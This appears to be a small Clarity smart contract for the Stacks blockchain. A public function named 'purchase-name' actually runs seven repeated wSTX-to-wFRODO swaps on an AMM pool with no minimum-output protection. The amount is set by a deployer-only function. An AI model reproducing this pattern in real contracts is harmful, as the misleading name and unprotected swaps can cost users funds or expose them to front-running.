(define-constant A tx-sender)

(define-public (purchase-name)
    (ok (list 
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
        (hellofrodo (var-get ix))
    ))
)


(define-public (hellofrodo (dx uint))
  (let ((r (try! (contract-call? 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.amm-swap-pool-v1-1 swap-helper 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wstx 'SP3K8BC0PPEVCV7NZ6QSRWPQ2JE9E5B6N3PA0KBR9.token-wfrodo u100000000 dx (some u0)))))
  (ok r))
)

(define-data-var ix uint u7000000000)
(define-public (six (k uint))
  (begin
    (asserts! (is-eq contract-caller A) (err u11))
    (ok (var-set ix k))
  )
)